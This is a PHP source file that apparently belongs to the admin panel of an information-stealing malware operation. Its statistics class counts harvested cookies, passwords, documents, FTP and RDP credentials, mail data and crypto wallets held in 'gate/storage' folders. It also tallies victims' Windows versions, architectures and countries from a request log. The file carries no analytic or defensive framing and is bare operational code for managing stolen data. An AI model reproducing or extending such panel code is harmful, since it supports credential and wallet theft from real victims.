<?php
	function scan($dir)
	{
		if(!file_exists($dir)) return null;
		$result = array();
		$files = array_diff(scandir($dir), array('..', '.', '.htaccess', 'cgi-bin', '.DS_Store'));
		foreach($files as $file) $result[] = "$dir/$file";
		return $result;
	}
	function countFiles($dir)
	{
		if(!file_exists($dir)) return null;
		$result = 0;
		$scanned = scan($dir);
		$scannedCount = count($scanned);
		for($i=0;$i<$scannedCount;$i++)
		{
			$fullPath = $scanned[$i];
			if(is_dir($fullPath)) $result += countFiles($fullPath);
			else $result++;
		}
		return $result;
	}
	class Model_Statistics extends Model
	{
		public function reportsInfo()
		{
			return array(
				'cookies' => countFiles('gate/storage/cookies'),
				'docs' => countFiles('gate/storage/docs'),
				'passwords' => countFiles('gate/storage/passwords'),
				'imcl' => countFiles('gate/storage/imcl'),
				'ftpcl' => countFiles('gate/storage/ftp') + countFiles('gate/storage/cuteftp'),
				'wallets' => countFiles('gate/storage/wallets'),
				'rdp' => countFiles('gate/storage/rdp'),
				'mail' => countFiles('gate/storage/mail'),
			);
		}
		public function osInfo()
		{
			if(!file_exists('gate/other/requests.log')) return null;
			$oslist = array();
			$result = array();
			$oss = explode('<:>', file_get_contents('gate/other/requests.log'));
			foreach ($oss as $oll)
			{
				$v = explode('<;>', $oll);
				if(count($v) < 5) break;
				$input = str_replace('Embedded', '', $v[5]);
				if(mb_strpos($input,'Windows XP')!==false) $input = 'Windows XP';
				else if(mb_strpos($input,'Windows 7')!==false) $input = 'Windows 7';
				else if(mb_strpos($input,'Windows 8.1')!==false) $input = 'Windows 8.1';
				else if(mb_strpos($input,'Windows 8')!==false) $input = 'Windows 8';
				else if(mb_strpos($input,'Windows 10')!==false) $input = 'Windows 10';
				else $input = 'Windows X';
				$oslist[] = $input;
			}
			$sorted = array();
			$cos = count($oslist);
			$incsor = array_fill(0, $cos, 0);
			for($i=0;$i<$cos;$i++)
			{
				if(in_array($oslist[$i], $sorted))
				{
					continue;
				}
				for($k=0;$k<$cos;$k++)
				{
					if (strcmp($oslist[$i], $oslist[$k]) === 0)
					{
						$incsor[$i]++;
						$sorted[] = $oslist[$i];
					}
				}
			}
			arsort($incsor, SORT_NUMERIC);
			$keylist = array_keys($incsor);
			$result = array();
			for($i=0;$i<$cos;$i++)
			{
				$idx = $incsor[$keylist[$i]];
				if($idx == 0) continue;
				$result[] = array($oslist[$keylist[$i]], $incsor[$keylist[$i]]);
			}
			return array_slice($result, 0, 4);
		}
		public function arcInfo()
		{
			if(!file_exists('gate/other/requests.log')) return null;
			$oslist = array();
			$result = array();
			$oss = explode('<:>', file_get_contents('gate/other/requests.log'));
			foreach ($oss as $oll)
			{
				$v = explode('<;>', $oll);
				if(count($v) < 5) break;
				$oslist[] = mb_substr($v[5], mb_strlen($v[5])-3);
			}
			$sorted = array();
			$cos = count($oslist);
			$incsor = array_fill(0, $cos, 0);
			for($i=0;$i<$cos;$i++)
			{
				if(in_array($oslist[$i], $sorted))
				{
					continue;
				}
				for($k=0;$k<$cos;$k++)
				{
					if (strcmp($oslist[$i], $oslist[$k]) === 0)
					{
						$incsor[$i]++;
						$sorted[] = $oslist[$i];
					}
				}
			}
			arsort($incsor, SORT_NUMERIC);
			$keylist = array_keys($incsor);
			$result = array();
			for($i=0;$i<$cos;$i++)
			{
				$idx = $incsor[$keylist[$i]];
				if($idx == 0) continue;
				$result[] = array($oslist[$keylist[$i]], $incsor[$keylist[$i]]);
			}
			return array_slice($result, 0, 4);
		}
		public function countryInfo()
		{
			if(!file_exists('gate/other/requests.log')) return null;
			$oslist = array();
			$result = array();
			$oss = explode('<:>', file_get_contents('gate/other/requests.log'));
			foreach ($oss as $oll)
			{
				$v = explode('<;>', $oll);
				if(count($v) < 5) break;
				$oslist[] = $v[2];
			}
			$sorted = array();
			$cos = count($oslist);
			$incsor = array_fill(0, $cos, 0);
			for($i=0;$i<$cos;$i++)
			{
				if(in_array($oslist[$i], $sorted))
				{
					continue;
				}
				for($k=0;$k<$cos;$k++)
				{
					if (strcmp($oslist[$i], $oslist[$k]) === 0)
					{
						$incsor[$i]++;
						$sorted[] = $oslist[$i];
					}
				}
			}
			arsort($incsor, SORT_NUMERIC);
			$keylist = array_keys($incsor);
			$result = array();
			for($i=0;$i<$cos;$i++)
			{
				$idx = $incsor[$keylist[$i]];
				if($idx == 0) continue;
				$result[] = array($oslist[$keylist[$i]], $incsor[$keylist[$i]]);
			}
			return array_slice($result, 0, 4);
		}
	}
?>